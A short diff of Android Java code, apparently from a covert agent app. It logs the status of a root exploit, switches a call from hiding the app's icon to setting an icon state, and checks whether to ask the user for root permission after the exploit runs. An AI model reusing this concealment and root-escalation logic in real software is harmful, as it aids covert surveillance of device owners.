@@ -117,7 +117,7 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "  exploitStatus == " + Status.getExploitStatusString() +"  exploitResult == " + Status.getExploitResultString());
 			}
-			Status.hideIcon();
+			Status.setIconState(true);
 
 			/* this check is used to know if we need to ask the user for root permission */
 			if ((Status.getExploitStatus() >= Status.EXPLOIT_STATUS_EXECUTED ) && !Status.haveRoot()) {
